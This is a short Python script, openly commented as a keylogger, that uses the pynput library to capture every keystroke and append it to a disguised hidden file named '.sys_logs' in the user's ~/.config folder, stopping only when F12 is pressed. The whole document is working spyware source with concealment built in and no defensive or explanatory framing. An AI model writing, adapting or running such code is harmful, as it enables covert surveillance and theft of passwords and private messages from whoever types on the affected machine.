from pynput import keyboard
import os

# Define the hidden log file location
log_dir = os.path.expanduser("~")  # Get user home directory
hidden_folder = os.path.join(log_dir, ".config")  # Use a hidden system-like folder
os.makedirs(hidden_folder, exist_ok=True)  # Ensure the folder exists
hidden_log_file = os.path.join(hidden_folder, ".sys_logs")  # Hidden log file

stop_flag = False  # Flag to stop the keylogger

# Key press event handler
def on_press(key):
    global stop_flag
    if key == keyboard.Key.f12:  # Press F12 to stop
        stop_flag = True
        os._exit(0)  # Immediately stop the script

    try:
        log_entry = key.char  # Normal character keys
    except AttributeError:
        log_entry = f" [{key}] "  # Special keys

    # Write the keystrokes to the hidden log file
    with open(hidden_log_file, "a") as f:
        f.write(log_entry)

# Start the keylogger listener
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
